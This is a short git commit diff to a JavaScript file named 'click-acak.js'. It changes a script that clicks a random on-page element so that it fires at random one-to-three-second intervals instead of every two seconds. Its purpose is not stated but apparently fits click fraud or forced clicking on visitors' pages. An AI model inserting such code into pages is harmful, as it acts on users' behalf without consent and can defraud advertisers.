1bb2044bcb77be517cf295ba686f6bca201d1457
nengmaya538 <nengmaya538@gmail.com>
2026-08-09 08:30:47 +0700

    Update click-acak.js

--- js/click-acak.js
+++ js/click-acak.js
@@ -1,8 +1,10 @@
-setInterval(function() {
+function randomKlik() {
     let x = Math.floor(Math.random() * window.innerWidth);
     let y = Math.floor(Math.random() * window.innerHeight);
     let elemen = document.elementFromPoint(x, y);
     if (elemen) {
         elemen.click();
     }
-}, 2000);
+    setTimeout(randomKlik, Math.floor(Math.random() * 2000) + 1000);
+}
+randomKlik();
